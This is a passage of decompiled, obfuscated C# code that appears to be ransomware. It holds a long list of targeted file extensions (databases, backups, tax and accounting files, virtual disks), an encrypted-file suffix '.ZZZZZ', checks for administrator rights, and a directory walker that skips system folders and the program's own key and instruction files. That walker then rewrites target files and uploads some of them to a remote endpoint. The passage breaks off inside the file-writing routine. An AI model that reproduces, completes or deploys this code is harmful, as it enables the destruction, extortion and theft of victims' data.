				"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
				"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
				"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
				"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
				"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
				"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
				"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
				"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
				"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
				"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
				"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
				"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
				"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
				"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
				"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
				"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
				"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
				"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
				"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
				"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
				"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
				"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
				"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
				"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
				"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
				"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
				"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
				"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
				"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
				"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
				"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
				"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
				"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
				"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
				"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
				"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
				"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
				"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
				"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
				"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
				"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
				"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
				"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
				"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
				"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
				"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
				"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
				"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
				"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
				"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
				"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
				"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
				"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
				"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
				"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
				"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
				"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
				"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
				"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
				"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
				"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
				"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
				"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
				"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
				"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
				"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
				"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
				"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
				"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
				"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
				"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
				"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
				"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
				"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
				"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
				"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
				"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
				"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
				"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
				"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
				"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
				"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
				"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
				"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
				"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
				"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
				"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
				"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
				"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
				"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
				"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
				"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
				"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
				"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
				"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
				"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
				"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
				"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
				"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
				"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
				"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
				"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
				"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
				"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
				"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
				"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
				"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
				"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
				"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
				"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
				"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
				"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
				"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
				"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
				"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
				"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
				"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
				"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
				"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
				"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
				"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
				"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
				"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
				"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
				"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
				"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
				"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
				"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
				"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
				"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
				"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
				"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
				"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
				"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
				"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
				"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
				"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
				"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
				"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
				"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
				"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
				"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
				"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
				"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
				"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
				"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
				"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
				"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
				"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
				"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
				"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
				"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
				"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
				"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
				"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
				"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
				"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
				"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
				"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
				"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
				"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
				"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
				"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
				"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
				"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
				"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
				"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
				"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
				"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
				"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
				"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
				"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
				"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
				"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
				"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
				"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
				"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
				"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
				"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
				"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
				"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
				"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
				"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
				"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
				"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
				"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
				"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
				"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
				"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
				"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
				"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
				"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
				"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
				"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
				"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
				"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
				"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
				"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
				"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
				"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
				"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
				"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
				"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
				"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
				"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
				"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
				"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
				"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
				"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
				"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
				"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
				"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
				"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
				"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
				"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
				"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
				"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
				"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
				"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
				"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
				"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
				"AVHD", "AVHDX", "OVA", "BKF", "altrdf", "ALTRDF", "altc", "alttr", "bck", "TIBX",
				"tibx", "ARC", "fina"
			}, ".ZZZZZ", new string[0], rtATyKSVirO);
		}
	}

	[CompilerGenerated]
	private sealed class VZxyuOIGlVzd
	{
		private sealed class iGQiTttbBZSNQ
		{
			public VZxyuOIGlVzd dPYGJAwDoA;

			public string qppssXIVYdL;

			public void _003CCrypt_003Eb__38()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					vYdUiwPtSnKrD(WindowsIdentity.GetCurrent().Name, qppssXIVYdL);
				}
			}

			public void _003CCrypt_003Eb__39()
			{
				eGTKDDPKaFeGW(qppssXIVYdL, dPYGJAwDoA.oVvSKYwivLckKU, dPYGJAwDoA.QMFvZYrQpA, dPYGJAwDoA.ngteDIWRWunLm, dPYGJAwDoA.LsMDxmXGdSxT);
			}
		}

		public string[] oVvSKYwivLckKU;

		public string[] ngteDIWRWunLm;

		public string LsMDxmXGdSxT;

		public string QMFvZYrQpA;

		public void _003CCrypt_003Eb__37(string t)
		{
			if (lAAXflzcqhB && !LmZNugIjEba().Contains("XP") && !LmZNugIjEba().Contains("Windows 7"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						vYdUiwPtSnKrD(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (BHjDxJUUfXETE == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					eGTKDDPKaFeGW(t, oVvSKYwivLckKU, QMFvZYrQpA, ngteDIWRWunLm, LsMDxmXGdSxT);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				eGTKDDPKaFeGW(t, oVvSKYwivLckKU, QMFvZYrQpA, ngteDIWRWunLm, LsMDxmXGdSxT);
			}
		}
	}

	[CompilerGenerated]
	private sealed class MMSyVjTNuercX
	{
		private sealed class kTJSoWSumtcsZCQR
		{
			public MMSyVjTNuercX bLAduYWOzr;

			public string dQotRvOnqv;

			public void _003CWorkerCrypter2_003Eb__46()
			{
				foreach (string item in CaWnKQHcaGrIr)
				{
					if (dQotRvOnqv.ToLower().EndsWith(item + bLAduYWOzr.EffhycCZIlyfd) && CxqzogRLMjBXRE == "YES")
					{
						if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > new FileInfo(dQotRvOnqv).Length)
						{
							try
							{
								tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", dQotRvOnqv);
							}
							catch
							{
							}
						}
					}
					else if (dQotRvOnqv.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "NO")
					{
						try
						{
							tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", dQotRvOnqv);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class lzygznjgNHrTD
		{
			public MMSyVjTNuercX bLAduYWOzr;

			public string DiEZvVBVhpib;

			public void _003CWorkerCrypter2_003Eb__48()
			{
				foreach (string item in CaWnKQHcaGrIr)
				{
					if (DiEZvVBVhpib.ToLower().EndsWith(item + bLAduYWOzr.EffhycCZIlyfd) && CxqzogRLMjBXRE == "YES")
					{
						if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > new FileInfo(DiEZvVBVhpib).Length)
						{
							try
							{
								tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", DiEZvVBVhpib);
							}
							catch
							{
							}
						}
					}
					else if (DiEZvVBVhpib.ToLower().EndsWith(item) && CxqzogRLMjBXRE == "NO")
					{
						try
						{
							tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", DiEZvVBVhpib);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> CeGwqiGcZtQOavm;

		public List<string> wJRlewgeJSybuONn;

		public string EffhycCZIlyfd;

		public string[] nmAkxakLDtEJM;

		public string rtATyKSVirO;

		public void _003CWorkerCrypter2_003Eb__45(string t1)
		{
			string dQotRvOnqv;
			foreach (string item in wJRlewgeJSybuONn)
			{
				if (((item.Contains("C:\\Program Files\\") || item.Contains("C:\\Program Files (x86)\\") || item.Contains(":\\Windows\\") || item.ToLower().Contains("perflogs") || item.ToLower().Contains("internet explorer") || item.Contains(":\\ProgramData\\") || item.Contains("\\AppData\\") || item.ToLower().Contains("msocache") || item.ToLower().Contains("system volume information") || item.ToLower().Contains("boot") || item.ToLower().Contains("tor browser") || item.ToLower().Contains("mozilla") || item.ToLower().Contains("google chrome") || item.ToLower().Contains("application data")) && !item.Contains(joRKfFeYni("TWljcm9zb2Z0IFNRTCBTZXJ2ZXI="))) || item.Contains("autoexec.bat") || item.Contains("desktop.ini") || item.Contains("autorun.inf") || item.Contains("ntuser.dat") || item.Contains("NTUSER.DAT") || item.Contains("iconcache.db") || item.Contains("bootsect.bak") || item.Contains("boot.ini") || item.Contains("ntuser.dat.log") || item.Contains("thumbs.db") || item.ToLower().Contains("bootmgr") || item.ToLower().Contains("pagefile.sys") || item.ToLower().Contains("config.sys") || item.ToLower().Contains("ntuser.ini") || item.Contains(joRKfFeYni("QnVpbGRlcl9Mb2c=")) || item.Contains("RSAKeys") || item.Contains("ECCKeys") || item.Contains("Config.enc") || item.Contains("Инструкция") || item.EndsWith(EffhycCZIlyfd) || item.EndsWith("exe") || item.EndsWith("dll") || item.EndsWith("EXE") || item.EndsWith("DLL") || item.Contains("Recycle.Bin") || item.Contains(vDqPFVseLDSEcY) || item.Contains(zRTqZqtXid) || item.Contains(mPCnRrJrfRICdG))
				{
					continue;
				}
				if (nmAkxakLDtEJM.Length != 0)
				{
					string[] array = nmAkxakLDtEJM;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0b8d;
					}
				}
				try
				{
					if (item.EndsWith(EffhycCZIlyfd))
					{
						goto IL_0b8d;
					}
				}
				catch (Exception)
				{
					goto IL_0b8d;
				}
				if (!item.EndsWith(t1) || NnFouaTmgntTWt.Contains(item))
				{
					continue;
				}
				if (LitDbhWzmovijj == "YES")
				{
					try
					{
						if (fbDAqJbVdGX.muSdOUxGcrOy(item))
						{
							fbDAqJbVdGX.yDSXoshfrbq(item);
						}
					}
					catch
					{
					}
				}
				NnFouaTmgntTWt.Add(item);
				if (!jjfntRYhuFNxp.Contains(Path.GetDirectoryName(item)))
				{
					jjfntRYhuFNxp.Add(Path.GetDirectoryName(item));
				}
				SUdHgdcEVqPlo(item);
				try
				{
					new VYzGohYILkFyc().XUlcnnRhoSBk(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (aLMUqgosPdtj)
							{
								Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
